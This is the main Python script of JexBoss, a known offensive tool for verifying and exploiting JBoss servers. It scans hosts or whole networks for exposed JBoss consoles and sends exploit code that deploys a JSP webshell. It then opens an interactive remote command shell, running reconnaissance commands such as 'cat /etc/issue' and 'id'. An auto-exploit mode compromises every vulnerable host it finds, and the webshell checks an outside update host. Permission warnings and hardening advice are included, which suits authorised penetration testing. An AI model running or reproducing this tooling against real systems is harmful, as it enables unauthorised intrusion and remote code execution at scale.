#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
JexBoss: Jboss verify and EXploitation Tool
https://github.com/joaomatosf/jexboss

Copyright 2013 João Filho Matos Figueiredo

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""
import textwrap
import traceback
from urllib3.util import parse_url

RED = '\x1b[91m'
RED1 = '\033[31m'
BLUE = '\033[94m'
GREEN = '\033[32m'
BOLD = '\033[1m'
NORMAL = '\033[0m'
ENDC = '\033[0m'

__author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
__version = "1.0.9"

import signal
from sys import argv, exit, version_info
from _exploits import *
from _updates import *
from os import name, system
import os
import shutil
from zipfile import ZipFile
from time import sleep
from random import randint
import argparse
import ipaddress, socket

try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode

try:
    from urllib3 import disable_warnings, PoolManager
    from urllib3.util.timeout import Timeout
except ImportError:
    ver = version_info[0] if version_info[0] >= 3 else ""
    print(RED1 + BOLD + "\n * Package urllib3 not installed. Please install the package urllib3 before continue.\n"
                        "" + GREEN + "   Example: \n"
                                     "   # apt-get install python%s-pip ; easy_install%s urllib3\n" % (ver, ver) + ENDC)
    exit(0)

from urllib3 import disable_warnings, PoolManager
from urllib3.util.timeout import Timeout

disable_warnings()

timeout = Timeout(connect=3.0, read=6.0)
pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')

global gl_interrupted
gl_interrupted = False

user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
               "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
               "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
               "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
               "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
               "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
               "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
               "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
               "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"]

global gl_args


def handler_interrupt(signum, frame):
    global gl_interrupted
    gl_interrupted = True
    print ("Interrupting execution ...")

signal.signal(signal.SIGINT, handler_interrupt)

def get_successfully(url, path):
    """
    Test if a GET to a URL is successful
    :param url: The base URL
    :param path: The URL path
    :return: The HTTP status code
    """
    sleep(5)
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
    r = pool.request('GET', url + path, redirect=False, headers=headers)
    result = r.status
    if result == 404:
        sleep(7)
        r = pool.request('GET', url + path, redirect=False, headers=headers)
        result = r.status
    return result

def check_connectivity(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((str(host), int(port)))
        s.close()
    except socket.timeout:
        return False
    except:
        return False


    return True

def check_vul(url):
    """
    Test if a GET to a URL is successful
    :param url: The URL to test
    :return: A dict with the exploit type as the keys, and the HTTP status code as the value
    """
    if gl_args.mode == 'auto-scan' or gl_args.mode == 'file-scan':
        timeout = Timeout(connect=1.0, read=3.0)
        pool = PoolManager(timeout=timeout, retries=1, cert_reqs='CERT_NONE')
    else:
        timeout = Timeout(connect=3.0, read=6.0)
        pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')

    url_check = parse_url(url)
    if '443' in str(url_check.port) and url_check.scheme != 'https':
        url = "https://"+str(url_check.host)+":"+str(url_check.port)

    print(GREEN + "\n ** Checking Host: %s **\n" % url)

    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}

    paths = {"jmx-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
             "web-console" 	: "/web-console/ServerInfo.jsp",
             "JMXInvokerServlet": "/invoker/JMXInvokerServlet",
             "admin-console" : "/admin-console/"}

    for i in paths.keys():
        if gl_interrupted: break
        try:
            print(GREEN + " * Checking %s: \t" % i + ENDC),
            r = pool.request('HEAD', url +str(paths[i]), redirect=False, headers=headers)
            paths[i] = r.status
            if paths[i] in (301, 302, 303, 307, 308):
                url_redirect = r.get_redirect_location()
                print(GREEN + "[ REDIRECT ]\n * The server sent a redirect to: %s\n" % url_redirect)
            elif paths[i] == 200 or paths[i] == 500:
                if i == "admin-console":
                    print(RED + "[ EXPOSED ]" + ENDC)
                else:
                    print(RED + "[ VULNERABLE ]" + ENDC)
            else:
                print(GREEN + "[ OK ]")
        except:
            print(RED + "\n * An error occurred while connecting to the host %s\n" % url + ENDC)
            paths[i] = 505

    return paths

def auto_exploit(url, exploit_type):
    """
    Automatically exploit a URL
    :param url: The URL to exploit
    :param exploit_type: One of the following
    exploitJmxConsoleFileRepository: tested and working in JBoss 4 and 5
    exploitJmxConsoleMainDeploy:	 tested and working in JBoss 4 and 6
    exploitWebConsoleInvoker:		 tested and working in JBoss 4
    exploitJMXInvokerFileRepository: tested and working in JBoss 4 and 5
    exploitAdminConsole: tested and working in JBoss 5 and 6 (with default password)
    """
    print(GREEN + "\n * Sending exploit code to %s. Please wait...\n" % url)
    result = 505
    if exploit_type == "jmx-console":
        result = exploit_jmx_console_file_repository(url)
        if result != 200 and result != 500:
            result = exploit_jmx_console_main_deploy(url)
    elif exploit_type == "web-console":
        result = exploit_web_console_invoker(url)
    elif exploit_type == "JMXInvokerServlet":
        result = exploit_jmx_invoker_file_repository(url, 0)
        if result != 200 and result != 500:
            result = exploit_jmx_invoker_file_repository(url, 1)
    elif exploit_type == "admin-console":
        result = exploit_admin_console(url)

    if result == 200 or result == 500:
        if not gl_args.auto_exploit:
            print(GREEN + " * Successfully deployed code! Starting command shell. Please wait...\n" + ENDC)
            shell_http(url, exploit_type)
        else:
            print(GREEN + " * Successfully deployed code via vector %s\n *** Run JexBoss in Standalone mode to open command shell. ***" %(exploit_type) + ENDC)
            return True
    else:
        print(RED + "\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\n" +
                    "   Waiting for 7 seconds...\n " + ENDC)
        if gl_args.mode == 'standalone':
            sleep(7)
            return False
        else:
            return False

def shell_http(url, shell_type):
    """
    Connect to an HTTP shell
    :param url: The URL to connect to
    :param shell_type: The type of shell to connect to
    """
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}

    if gl_args.disable_check_updates:
        headers['check-updates'] = 'false'

    if shell_type == "jmx-console" or shell_type == "web-console" or shell_type == "admin-console":
        path = '/jexws3/jexws3.jsp?'
    elif shell_type == "JMXInvokerServlet":
        path = '/jexinv3/jexinv3.jsp?'

    pool.request('GET', url+ path, redirect=False, headers=headers)

    sleep(7)
    resp = ""
    print(" * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - * \n")
    print(RED + " * " + url + ": \n" + ENDC)

    for cmd in ['uname -a', 'cat /etc/issue', 'id']:
        cmd = urlencode({"ppp": cmd})
        r = pool.request('GET', url + path + cmd, redirect=False, headers=headers)
        resp += " " + str(r.data).split(">")[1]
    print(resp.replace('\\n', '\n')),

    while 1:
        print(BLUE + "[Type commands or \"exit\" to finish]")
        cmd = input("Shell> " + ENDC) if version_info[0] >= 3 else raw_input("Shell> " + ENDC)
        if cmd == "exit":
            break

        cmd = urlencode({"ppp": cmd})
        r = pool.request('GET', url + path + cmd, redirect=False, headers=headers)
        resp = str(r.data)
        if r.status == 404:
            print(RED + " * Error contacting the command shell. Try again later...")
            continue
        stdout = ""
        try:
            stdout = resp.split("pre>")[1]
        except:
            print(RED + " * Error contacting the command shell. Try again later...")
        if stdout.count("An exception occurred processing JSP page") == 1:
            print(RED + " * Error executing command \"%s\". " % cmd.split("=")[1] + ENDC)
        else:
            print(stdout.replace('\\n', '\n'))

def clear():
    """
    Clears the console
    """
    if name == 'posix':
        system('clear')
    elif name == ('ce', 'nt', 'dos'):
        system('cls')

def banner():
    """
    Print the banner
    """
    clear()
    print(RED1 + "\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\n"
                 " |                                                      |\n"
                 " | @author:  João Filho Matos Figueiredo                |\n"
                 " | @contact: joaomatosf@gmail.com                       |\n"
                 " |                                                      |\n"
                 " | @update: https://github.com/joaomatosf/jexboss       |\n"
                 " #______________________________________________________#\n")
    print(RED1 + " @version: %s\n"%__version )

    print (ENDC)

def help_usage():
    usage = (BOLD + BLUE + "\n Examples:\n" + ENDC +
    BLUE + "\n For simple usage, you must provide the host name or IP address you want to test:" +
    GREEN + "\n\n  $ python jexboss.py -host https://site.com.br" +
    BLUE + "\n\n For auto scan mode, you must provide the network in CIDR format, list of ports and filename for store results:" +
    GREEN + "\n\n  $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log" +
    BLUE + "\n\n For file scan mode, you must provide the filename with host list to be scanned (one host per line)and filename for store results:" +
    GREEN + "\n\n  $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log" + ENDC)
    return usage

def network_args(string):
    try:
        if version_info[0] >= 3:
            value = ipaddress.ip_network(string)
        else:
            value = ipaddress.ip_network(unicode(string))
    except:
        msg = "%s is not a network address in CIDR format." % string
        raise argparse.ArgumentTypeError(msg)
    return value

def main():
    """
    Run interactively. Call when the module is run by itself.
    :return: Exit code
    """
    # check for Updates
    updates = check_updates()
    if updates:
        print(BLUE + BOLD + "\n\n * An update is available and is recommended update before continuing.\n" +
              "   Do you want to update now?")
        pick = input("   YES/no ? ").lower() if version_info[0] >= 3 else raw_input("   YES/no ? ").lower()
        print (ENDC)
        if pick != "no":
            updated = auto_update()
            if updated:
                print(GREEN + BOLD + "\n * The JexBoss has been successfully updated. Please run again to enjoy the updates.\n" +ENDC)
                exit(0)
            else:
                print(RED + BOLD + "\n\n * An error occurred while updating the JexBoss. Please try again..\n" +ENDC)
                exit(1)

    vulnerables = False
    # check vulnerabilities for standalone mode
    if gl_args.mode == 'standalone':
        url = gl_args.host
        scan_results = check_vul(url)
        # performs exploitation
        for i in ["jmx-console", "web-console", "JMXInvokerServlet", "admin-console"]:
            if scan_results[i] == 200 or scan_results[i] == 500:
                vulnerables = True
                if gl_args.auto_exploit:
                    auto_exploit(url, i)
                else:
                    print(BLUE + "\n\n * Do you want to try to run an automated exploitation via \"" +
                          BOLD + i + NORMAL + "\" ?\n" +
                          "   This operation will provide a simple command shell to execute commands on the server..\n" +
                          RED + "   Continue only if you have permission!" + ENDC)
                    pick = input("   yes/NO ? ").lower() if version_info[0] >= 3 else raw_input("   yes/NO ? ").lower()
                    if pick == "yes":
                        auto_exploit(url, i)
    # check vulnerabilities for auto scan mode
    elif gl_args.mode == 'auto-scan':
        file_results = open(gl_args.results, 'w')
        file_results.write("JexBoss Scan Mode Report\n\n")
        for ip in gl_args.network.hosts():
            if gl_interrupted: break
            for port in gl_args.ports.split(","):
                if check_connectivity(ip, port):
                    url = "{0}:{1}".format(ip,port)
                    ip_results = check_vul(url)
                    for key in ip_results.keys():
                        if ip_results[key] == 200 or ip_results[key] == 500:
                            vulnerables = True
                            if gl_args.auto_exploit:
                                result_exploit = auto_exploit(url, key)
                                if result_exploit:
                                    file_results.write("{0}:\t[EXPLOITED VIA {1}]\n".format(url, key))
                                else:
                                    file_results.write("{0}:\t[FAILED TO EXPLOITED VIA {1}]\n".format(url, key))
                            else:
                                file_results.write("{0}:\t[POSSIBLY VULNERABLE TO {1}]\n".format(url, key))

                            file_results.flush()
                else:
                    print (RED+"\n * Host %s:%s does not respond."% (ip,port)+ENDC)
        file_results.close()

    elif gl_args.mode == 'file-scan':
        file_results = open(gl_args.out, 'w')
        file_results.write("JexBoss Scan Mode Report\n\n")
        file_input = open(gl_args.file, 'r')
        for url in file_input.readlines():
            if gl_interrupted: break
            url = url.strip()
            ip = str(parse_url(url)[2])
            port = parse_url(url)[3] if parse_url(url)[3] != None else 80
            if check_connectivity(ip, port):
                url_results = check_vul(url)
                for key in url_results.keys():
                    if url_results[key] == 200 or url_results[key] == 500:
                        vulnerables = True
                        if gl_args.auto_exploit:
                            result_exploit = auto_exploit(url, key)
                            if result_exploit:
                                file_results.write("{0}:\t[EXPLOITED VIA {1}]\n".format(url, key))
                            else:
                                file_results.write("{0}:\t[FAILED TO EXPLOITED VIA {1}]\n".format(url, key))
                        else:
                            file_results.write("{0}:\t[POSSIBLY VULNERABLE TO {1}]\n".format(url, key))

                        file_results.flush()
            else:
                print (RED + "\n * Host %s:%s does not respond." % (ip, port) + ENDC)
        file_results.close()

    # resume results
    if vulnerables:
        banner()
        print(RED + BOLD+" Results: potentially compromised server!" + ENDC)
        if gl_args.mode  == 'file-scan':
            print(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.out) + ENDC)
        elif gl_args.mode == 'auto-scan':
            print(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.results) + ENDC)
        print(GREEN + " * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n"
             +BOLD+   " Recommendations: \n" +ENDC+
              GREEN+  " - Remove web consoles and services that are not used, eg:\n"
                      "    $ rm web-console.war\n"
                      "    $ rm http-invoker.sar\n"
                      "    $ rm jmx-console.war\n"
                      "    $ rm jmx-invoker-adaptor-server.sar\n"
                      "    $ rm admin-console.war\n"
                      " - Use a reverse proxy (eg. nginx, apache, F5)\n"
                      " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
                      " - Search vestiges of exploitation within the directories \"deploy\" and \"management\".\n\n"
                      " References:\n"
                      "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
                      "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
                      "\n"
                      " - If possible, discard this server!\n"
                      " * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n")
    else:
        print(GREEN + "\n\n * Results: \n" +
              "   The server is not vulnerable to bugs tested ... :D\n\n" + ENDC)
    # infos
    print(ENDC + " * Info: review, suggestions, updates, etc: \n" +
          "   https://github.com/joaomatosf/jexboss\n")

    print(GREEN + BOLD + " * DONATE: " + ENDC + "Please consider making a donation to help improve this tool,\n"
                                                "           including research to new versions of JBoss and zero days. \n\n" +
          GREEN + BOLD + " * Paypal: " + ENDC + " joaomatosf@gmail.com \n" +
          GREEN + BOLD + " * Bitcoin Address: " + ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n" +
          GREEN + BOLD + " * URI: " + ENDC + " bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss\n")


print(ENDC)

banner()


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        #description="JexBoss v%s: JBoss verify and EXploitation Tool" %__version,
        description=textwrap.dedent(RED1 + "\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\n"
                 " |                                                      |\n"
                 " | @author:  João Filho Matos Figueiredo                |\n"
                 " | @contact: joaomatosf@gmail.com                       |\n"
                 " |                                                      |\n"
                 " | @update: https://github.com/joaomatosf/jexboss       |\n"
                 " #______________________________________________________#\n"
                 " @version: "+__version+"\n"+ help_usage()),
        epilog="",
        prog="JexBoss"
    )

    group_standalone = parser.add_argument_group('Standalone mode')
    group_auto_scan = parser.add_argument_group('Auto scan mode')
    group_file_scan = parser.add_argument_group('File scan mode')

    parser.add_argument('--version', action='version', version='%(prog)s ' + __version)
    parser.add_argument("--auto-exploit", "-A",
                        help="Send exploit code automatically (USE ONLY IF YOU HAVE PERMISSION!!!)",
                        action='store_true')
    parser.add_argument("--disable-check-updates", "-D", help="Disable the check for updates performed by JSP Webshell at: http://webshell.jexboss.net/jsp_version.txt",
                        action='store_true')
    parser.add_argument('-mode', help="Operation mode", choices={'standalone','auto-scan', 'file-scan'}, default='standalone')

    group_standalone.add_argument("-host", help="Host address to be checked (eg. http://192.168.0.10:8080)",
                                  type=str)
    group_auto_scan.add_argument("-network", help="Network to be checked in CIDR format (eg. 10.0.0.0/8)",
                            type=network_args, default='192.168.0.0/24')
    group_auto_scan.add_argument("-ports",
                            help="List of ports separated by commas to be checked for each host (eg. 8080,8443,8888,80,443)", type=str, default='8080,80')
    group_auto_scan.add_argument("-results",
                            help="File name to store the auto scan results", type=str, metavar='FILENAME', default='jexboss_auto_scan_results.log')

    group_file_scan.add_argument("-file", help="Filename with host list to be scanned (one host per line)", type=str, metavar='FILENAME_HOSTS')
    group_file_scan.add_argument("-out", help="File name to store the file scan results", type=str, metavar='FILENAME_RESULTS', default='jexboss_file_scan_results.log')

    gl_args = parser.parse_args()

    #if 'h' not in gl_args and gl_args.host == None:
    #    parser.print_help()

    if gl_args.mode == 'standalone' and gl_args.host == None or \
        gl_args.mode == 'file-scan' and gl_args.file == None:
        banner()
        exit(0)
    else:
        main()
